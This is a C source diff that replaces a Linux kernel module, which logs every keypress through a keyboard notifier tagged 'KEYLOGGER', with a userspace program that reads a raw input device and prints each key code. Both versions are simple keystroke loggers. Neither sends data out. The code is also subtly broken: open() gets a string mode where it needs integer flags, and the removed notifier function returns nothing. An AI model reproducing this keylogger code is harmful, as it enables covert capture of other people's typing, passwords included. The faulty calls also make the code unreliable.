@@ -1,41 +1,26 @@
-#undef __KERNEL__
-#define __KERNEL__
+#include <linux/input.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <stdio.h>
+#include <unistd.h>
 
-#undef MODULE
-#define MODULE
+int main(int argc, char **argv) {
+	int key;
 
-
-#include <linux/kernel.h> 	// included for KERN_DEBUG
-#include <linux/module.h>	// included for all kernel modules
-#include <linux/init.h>		// included for __init and __exit macros
-#include <linux/keyboard.h>	// included for keyboard_notifier_param, notifier_block and vc_data structs
-#include <linux/input.h>	// included for (future) key conversion table
-
-
-int secret_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
-	// keyboard_notifier_param contains the info about the key pressed, i.e. keycode, keysys, unicode value
-	struct keyboard_notifier_param *param = _param;
-	struct vc_data *vc = param->vc;
-
-	int ret = NOTIFY_OK;
-
-	if (code == KBD_KEYCODE) {
-		printk(KERN_DEBUG "KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
+	if(argc < 2) {
+		printf("USAGE: %s <device>\n", argv[0]);
+		return 1;
 	}
-}
+	key = open(argv[1], "r");
+	struct input_event ev;
 
-static struct notifier_block nb = {
-	.notifier_call = secret_notify
-};
+	while(1) {
+		read(key, &ev, sizeof(struct input_event));
 
-static int secret_init(void) {
-	register_keyboard_notifier(&nb);
+	if(ev.type == 1) {
+		printf("key %i state %i\n", ev.code, ev.value);
+	}
+	}
+
 	return 0;
 }
-
-static void secret_release(void) {
-	unregister_keyboard_notifier(&nb);
-}
-
-module_init(secret_init);
-module_exit(secret_release);
